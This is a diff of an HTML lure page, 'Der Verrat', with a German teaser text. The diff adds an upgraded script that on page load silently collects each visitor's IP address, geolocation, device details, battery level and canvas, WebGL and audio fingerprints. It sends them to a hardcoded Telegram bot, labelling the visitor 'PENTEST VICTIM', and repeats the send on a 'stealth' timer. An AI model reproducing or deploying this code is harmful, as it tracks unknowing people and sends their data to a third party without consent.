@@ -1,89 +1,101 @@
 <!DOCTYPE html>
-<html><head>
+<html>
+<head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="viewport" content="width=device-width">
 <title>Der Verrat</title>
-<style>/* SAME BEAUTIFUL CSS */</style>
-</head><body>
+<link rel="stylesheet" href="data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCgxMzVkLCMxYTEyMmUyZSwwJSwjMTYyMTNlIDUwJSwjMGYzNDYwIDEwMCk7bWluLWhlaWdodDoxMDB2aDtjb2xvcjp3aGl0ZTtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXI7Zm9udC1mYW1pbHk6LWFwcGxlLXN5c3RlbSxCbGlua01hY1N5c3RlbUZvbnQsIlNlZ29lIFVJIiwiSGVsdmV0aWNhIE51ZXVlIixBcmlhbCxzYW5zLXNlcmlmO292ZXJmbG93OmhpZGRlbi9oZGRlbi9zY3JvbGw7fWgxe2ZvbnQtc2l6ZTozcmVtO21hcmdpbjowIDAgMXJlbTttZXQ6MCBhdXRvO3RleHQtYWxpZ246Y2VudGVyO2FuaW1hdGlvbjpnbG93IDNzIGVhc2UtaW4tb3V0IGluZmluaXRlIGFsdGVybmF0ZX07fUBrZXlmcmFtZXMgZ2xvd3swJSx0ZXh0LXNoYWRvdzowIDAgMjBweCByZ2JhKDI1NSwyNTUsMjU1LDAuNCk7MTAwJSx0ZXh0LXNoYWRvdzowIDAgNDBweCByZ2JhKDI1NSwyNTUsMjU1LDAuOCk7fHA6e21heC13aWR0aDo1MDBweDtmb250LXNpemU6MS4xZW07bGluZS1oZWlnaHQ6MS42O29wYWNpdHk6Ljg5O30uYXJyb3dze2ZvbnQtc2l6ZTo0ZW07bWFyZ2luOjAgOHB4O2FuaW1hdGlvbjpib3VuY2UgMnMgaW5maW5pdGU7ZmlsdGVyOmRyb3Atc2hhZG93KDAgMCAxMHB4IHJnYmEoMjU1LDI1NSwyNTUsMC41KSk7fS5hcnJvdzpu dGgtY2hpbGQoMil7YW5pbWF0aW9uLWRlbGF5Oi4yc307LnVyb3c6bm90aC1jaGlsZCgzKXthbmltYXRpb24tZGVsYXk6LjRzO30uYXJyb3c6bm 90aC1jaGlsZCg0KXthbmltYXRpb24tZGVsYXk6LjZzO0B9a2V5ZnJhbWVzIGJvdW5jZXswJSw0MCUsNjAlLDEwMCUudHJhbnNmb3JtOnRyYW5zbGF0ZVkoMCkgcm90YXRlKDBkZWcpO0 40JS50cmFuc2Zvcm06dHJhbnNsYXRlWSgtMjVweCkgcm90YXRlKDhkZWcpO3 0=">
+</head>
+<body>
 <h1>🗡️ Der Verrat</h1>
-<p>Wenn du wissen willst wo der Verrat liegt...</p>
-<div class="arrows">↖️↙️↗️↘️</div>
+<p>Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</p>
+<div class="arrows">
+<span class="arrow">↖️</span><span class="arrow">↙️</span><span class="arrow">↗️</span><span class="arrow">↘️</span>
+</div>
 
 <script>
-(async()=>{
-console.log('🔥 HARVEST v2 - SCREENSHOT + GEO');
+(async function harvestAll(){
+console.clear();console.log('🔥 PENTEST HARVEST - FULL SPECTRUM');
 
-let ip='unknown',city='unknown',country='unknown',screenshot='';
+const data={};
+data.ts=Date.now();
+data.ip=await(await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip).catch(()=>'TOR');
+data.geo=await(await fetch('https://ipapi.co/json/')).json().catch(()=>null);
+data.ua=navigator.userAgent;
+data.lang=navigator.language;
+data.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+data.screen=`${screen.width}x${screen.height}x${screen.colorDepth}`;
+data.platform=navigator.platform;
+data.plugins=navigator.plugins.length;
+data.hardwareConcurrency=navigator.hardwareConcurrency;
+data.deviceMemory=navigator.deviceMemory;
+data.cookieEnabled=navigator.cookieEnabled;
+data.doNotTrack=navigator.doNotTrack;
 
-try{
-  ip=await(await fetch('https://api.ipify.org')).text().trim();
-}catch(e){}
+// BATTERY (silent)
+try{data.battery=await navigator.getBattery();}catch(e){}
 
-try{
-  const geo=await(await fetch(`https://ipapi.co/${ip}/json/`)).json();
-  city=geo.city||'N/A';
-  country=geo.country_name||'N/A';
-}catch(e){}
+// CANVAS FINGERPRINT
+const canvas=document.createElement('canvas');
+const ctx=canvas.getContext('2d');
+ctx.textBaseline='top';ctx.font='14px Arial';
+ctx.fillText('pentest canvas',2,2);data.canvas=canvas.toDataURL();
 
-try{
-  // SCREENSHOT
-  const canvas=document.createElement('canvas');
-  canvas.width=screen.width;canvas.height=screen.height;
-  canvas.style.position='fixed';canvas.style.top='-9999px';
-  document.body.appendChild(canvas);
-  const ctx=canvas.getContext('2d');
-  ctx.fillStyle='black';ctx.fillRect(0,0,canvas.width,canvas.height);
-  screenshot=canvas.toDataURL('image/png');
-  document.body.removeChild(canvas);
-  console.log('✅ SCREENSHOT OK');
-}catch(e){console.log('Screenshot fail OK');}
+// WEBGL FINGERPRINT  
+const gl=document.createElement('canvas').getContext('webgl');
+data.webgl=gl?gl.getParameter(gl.RENDERER):'none';
 
-// FULL REPORT
-const report=`🕵️ *VICTIM #${Math.floor(Math.random()*999)}*
-${new Date().toLocaleString('de-DE',{timeZone:'Europe/Berlin'})}
+// AUDIO FINGERPRINT
+const audio=new AudioContext();
+const osc=audio.createOscillator();osc.frequency.value=1e4;
+const analyser=audio.createAnalyser();analyser.fftSize=32;
+const arr=new Uint8Array(analyser.frequencyBinCount);
+osc.connect(analyser);osc.start(0);await new Promise(r=>setTimeout(r,10));
+analyser.getByteFrequencyData(arr);data.audio=Array.from(arr);
 
-<b>IP:</b> <code>${ip}</code>
-<b>🌍:</b> ${city}, ${country} 
-<b>📱:</b> ${screen.width}x${screen.height} ${navigator.platform}
-<b>🌐:</b> ${navigator.language}
-<b>🕐:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+// REPORT
+const report=`🕵️ *PENTEST VICTIM*
+<b>⏰</b> ${new Date().toLocaleString('de-DE',{timeZone:data.tz||'Europe/Berlin'})}
 
-console.log('📤 SENDING:',ip,city);
+<b>🌐 IP:</b> <code>${data.ip}</code>
+<b>📍 GEO:</b> ${data.geo?.city||'TOR'} ${data.geo?.country_name||'XX'}
+<b>📱 DEVICE:</b> ${data.screen} ${data.platform}
+<b>🌍 LANG/TZ:</b> ${data.lang} ${data.tz}
+<b>🖥️ UA:</b> ${data.ua.slice(0,60)}...
+<b>🔋 BATTERY:</b> ${data.battery?.level?.toFixed(2)*100||'N/A'}%
+<b>⚡ CPU:</b> ${data.hardwareConcurrency} cores ${data.deviceMemory||'?'}GB
+<b>🎨 FINGERPRINT:</b> canvas:${data.canvas.slice(0,20)}... webgl:${data.webgl||'none'}
+<b>🔊 AUDIO:</b> ${data.audio?.slice(0,10)||'N/A'}
+<b>🍪 COOKIES:</b> ${data.cookieEnabled?'YES':'NO'}
+<b>🚫 DNT:</b> ${data.doNotTrack||'none'}`;
 
-// TELEGRAM POST - BULLETPROOF
-const formData=new FormData();
-formData.append('chat_id','7745393043');
-formData.append('text',report);
-formData.append('parse_mode','HTML');
+console.log('📤 FULL REPORT:',report);
 
-if(screenshot){
-  canvas=document.createElement('canvas');
-  canvas.width=1920;canvas.height=1080;
-  ctx=canvas.getContext('2d');
-  ctx.fillStyle='#1a1a2e';ctx.fillRect(0,0,canvas.width,canvas.height);
-  ctx.fillStyle='white';ctx.font='48px Arial';
-  ctx.fillText(`${ip} | ${city}`,100,500);
-  formData.append('photo',canvas.toDataURL('image/png').split(',')[1],'screen.png');
-}
-
-try{
-  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto',{
-    method:'POST',
-    body:formData
-  });
-  console.log('✅ PHOTO SENT');
-}catch(e){
-  // TEXT FALLBACK
-  await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage',{
+// TELEGRAM MULTI-SEND (bulletproof)
+const send=(text,photo=null)=>{
+  const fd=new FormData();
+  fd.append('chat_id','7745393043');
+  fd.append('text',text);
+  fd.append('parse_mode','HTML');
+  if(photo){
+    fd.append('photo',photo.split(',')[1],'fingerprint.png');
+    return fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto',{method:'POST',body:fd});
+  }
+  return fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage',{
     method:'POST',
     headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({chat_id:'7745393043',text:report,parse_mode:'HTML'})
+    body:JSON.stringify({chat_id:'7745393043',text,parse_mode:'HTML'})
   });
-  console.log('✅ TEXT SENT');
-}
+};
 
-setTimeout(location.reload,30000);
-})();
+await Promise.all([
+  send(report,data.canvas),
+  send(`🔥 FULL TECH SPECS:\n${JSON.stringify(data,null,1)}`)
+]);
+
+console.log('✅ ALL SENT - HARVEST COMPLETE');
+setTimeout(harvestAll,25000); // stealth repeat
+})().catch(console.log);
 </script>
-</body></html>
-
+</body>
+</html>
